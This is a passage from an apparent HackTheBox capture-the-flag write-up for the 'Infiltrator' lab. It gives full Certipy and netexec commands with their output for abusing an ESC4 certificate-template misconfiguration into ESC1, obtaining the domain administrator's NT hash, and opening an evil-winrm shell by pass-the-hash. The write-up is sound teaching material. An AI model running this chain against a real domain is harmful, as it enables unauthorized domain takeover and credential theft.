oxdf@hacky$ netexec winrm infiltrator.htb -u 'infiltrator_svc$' -H 9ae7de37439f359608eccf2cff5d32b9
WINRM       10.10.11.31     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb)
WINRM       10.10.11.31     5985   DC01             [-] infiltrator.htb\infiltrator_svc$:9ae7de37439f359608eccf2cff5d32b9
oxdf@hacky$ netexec rdp infiltrator.htb -u 'infiltrator_svc$' -H 9ae7de37439f359608eccf2cff5d32b9
RDP         10.10.11.31     3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:infiltrator.htb) (nla:True)
RDP         10.10.11.31     3389   DC01             [+] infiltrator.htb\infiltrator_svc$:9ae7de37439f359608eccf2cff5d32b9 

```

## Shell as Administrator

### ADCS Enumeration

Given that this is a domain controller, it’s not surprising that ADCS is available:

```

oxdf@hacky$ netexec ldap infiltrator.htb -u 'infiltrator_svc$' -H 9ae7de37439f359608eccf2cff5d32b9 -M adcs
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.31     389    DC01             [+] infiltrator.htb\infiltrator_svc$:9ae7de37439f359608eccf2cff5d32b9 
ADCS        10.10.11.31     389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.10.11.31     389    DC01             Found PKI Enrollment Server: dc01.infiltrator.htb
ADCS        10.10.11.31     389    DC01             Found CN: infiltrator-DC01-CA 

```

[Certipy](https://github.com/ly4k/Certipy) will use these creds to look for vulnerable configurations:

```

oxdf@hacky$ certipy find -vulnerable -dc-ip 10.10.11.31  -u 'infiltrator_svc$' -hashes :9ae7de37439f359608eccf2cff5d32b9 -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'infiltrator-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'infiltrator-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'infiltrator-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'infiltrator-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : infiltrator-DC01-CA
    DNS Name                            : dc01.infiltrator.htb
    Certificate Subject                 : CN=infiltrator-DC01-CA, DC=infiltrator, DC=htb
    Certificate Serial Number           : 724BCC4E21EA6681495514E0FD8A5149
    Certificate Validity Start          : 2023-12-08 01:42:38+00:00
    Certificate Validity End            : 2124-08-04 18:55:57+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : INFILTRATOR.HTB\Administrators
      Access Rights
        ManageCertificates              : INFILTRATOR.HTB\Administrators
                                          INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
        ManageCa                        : INFILTRATOR.HTB\Administrators
                                          INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
        Enroll                          : INFILTRATOR.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : Infiltrator_Template
    Display Name                        : Infiltrator_Template
    Certificate Authorities             : infiltrator-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          PendAllRequests
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Smart Card Logon
                                          Server Authentication
                                          KDC Authentication
                                          Client Authentication
    Requires Manager Approval           : True
    Requires Key Archival               : False
    Authorized Signatures Required      : 1
    Validity Period                     : 99 years
    Renewal Period                      : 650430 hours
    Minimum RSA Key Length              : 2048
    Permissions
      Object Control Permissions
        Owner                           : INFILTRATOR.HTB\Local System
        Full Control Principals         : INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
                                          INFILTRATOR.HTB\Local System
        Write Owner Principals          : INFILTRATOR.HTB\infiltrator_svc
                                          INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
                                          INFILTRATOR.HTB\Local System
        Write Dacl Principals           : INFILTRATOR.HTB\infiltrator_svc
                                          INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
                                          INFILTRATOR.HTB\Local System
        Write Property Principals       : INFILTRATOR.HTB\infiltrator_svc
                                          INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
                                          INFILTRATOR.HTB\Local System
    [!] Vulnerabilities
      ESC4                              : 'INFILTRATOR.HTB\\infiltrator_svc' has dangerous permissions

```

There’s an ESC4 risk for this account.

### ESC4 Exploit

I recently showed the ESC4 exploit on [EscapeTwo](/2025/05/24/htb-escapetwo.html#) (which came out way after Infiltrator). ESC4 says that the infiltrator\_svc$ account has excessive permissions over a template, `Infiltrator_Template`. This account can modify it to make it vulnerable to other ESC attacks.

`certipy template` will do just that:

```

oxdf@hacky$ certipy template -u 'infiltrator_svc$' -hashes :9ae7de37439f359608eccf2cff5d32b9 -dc-ip 10.10.11.31 -template Infiltrator_Template -save-old
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Saved old configuration for 'Infiltrator_Template' to 'Infiltrator_Template.json'
[*] Updating certificate template 'Infiltrator_Template'
[*] Successfully updated 'Infiltrator_Template'

```

The `template` command has changed a bit since the release of version 5 of `certipy` For v5.0.2, that command would replace `-save-old` with `-write-default-configuration -no-save`.

If I re-run the check for vulnerable templates, this one is now very vulnerable:

```

oxdf@hacky$ certipy find -vulnerable -u 'infiltrator_svc$' -hashes :9ae7de37439f359608eccf2cff5d32b9 -dc-ip 10.10.11.31 -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'infiltrator-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'infiltrator-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'infiltrator-DC01-CA' via RRP
[*] Got CA configuration for 'infiltrator-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : infiltrator-DC01-CA
    DNS Name                            : dc01.infiltrator.htb
    Certificate Subject                 : CN=infiltrator-DC01-CA, DC=infiltrator, DC=htb
    Certificate Serial Number           : 724BCC4E21EA6681495514E0FD8A5149
    Certificate Validity Start          : 2023-12-08 01:42:38+00:00
    Certificate Validity End            : 2124-08-04 18:55:57+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : INFILTRATOR.HTB\Administrators
      Access Rights
        ManageCertificates              : INFILTRATOR.HTB\Administrators
                                          INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
        ManageCa                        : INFILTRATOR.HTB\Administrators
                                          INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
        Enroll                          : INFILTRATOR.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : Infiltrator_Template
    Display Name                        : Infiltrator_Template
    Certificate Authorities             : infiltrator-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Object Control Permissions
        Owner                           : INFILTRATOR.HTB\Local System
        Full Control Principals         : INFILTRATOR.HTB\Authenticated Users
        Write Owner Principals          : INFILTRATOR.HTB\Authenticated Users
        Write Dacl Principals           : INFILTRATOR.HTB\Authenticated Users
        Write Property Principals       : INFILTRATOR.HTB\Authenticated Users
    [!] Vulnerabilities
      ESC1                              : 'INFILTRATOR.HTB\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
      ESC2                              : 'INFILTRATOR.HTB\\Authenticated Users' can enroll and template can be used for any purpose
      ESC3                              : 'INFILTRATOR.HTB\\Authenticated Users' can enroll and template has Certificate Request Agent EKU set
      ESC4                              : 'INFILTRATOR.HTB\\Authenticated Users' has dangerous permissions

```

To exploit ESC1, I ask certificate for the administrator:

```

oxdf@hacky$ certipy req -u 'infiltrator_svc$' -hashes :9ae7de37439f359608eccf2cff5d32b9 -dc-ip 10.10.11.31 -ca infiltrator-DC01-CA -target dc01.infiltrator.htb -template Infiltrator_Template -upn administrator@infiltrator.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 12
[*] Got certificate with UPN 'administrator@infiltrator.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

```

The `auth` subcommand takes that `.pfx` file and returns a TGT and the NTLM hash:

```

oxdf@hacky$ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.31
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@infiltrator.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@infiltrator.htb': aad3b435b51404eeaad3b435b51404ee:1356f502d2764368302ff0369b1121a1

```

In theory I should then put the original back (though there’s a very quick scheduled task doing that on Infiltrator, so I’m unlikely to actually need this):

```

oxdf@hacky$ certipy template -u 'infiltrator_svc$' -hashes :9ae7de37439f359608eccf2cff5d32b9 -dc-ip 10.10.11.31 -template Infiltrator_Template -configuration Infiltrator_Template.json
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'Infiltrator_Template'
[*] Successfully updated 'Infiltrator_Template'

```

### Validate Creds

I’ll check this hash using `netexec`:

```

oxdf@hacky$ netexec smb infiltrator.htb -u administrator -H aad3b435b51404eeaad3b435b51404ee:1356f502d2764368302ff0369b1121a1
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\administrator:1356f502d2764368302ff0369b1121a1 (Pwn3d!)

```

That shows admin access! It works for WinRM as well:

```

oxdf@hacky$ netexec winrm infiltrator.htb -u administrator -H aad3b435b51404eeaad3b435b51404ee:1356f502d2764368302ff0369b1121a1
WINRM       10.10.11.31     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb)
WINRM       10.10.11.31     5985   DC01             [+] infiltrator.htb\administrator:1356f502d2764368302ff0369b1121a1 (Pwn3d!)

```

### Shell

The hash works with Evil-WinRM:

```

oxdf@hacky$ evil-winrm -i infiltrator.htb -u administrator -H 1356f502d2764368302ff0369b1121a1
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

And I can read `root.txt`:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
c7a91bd4************************

```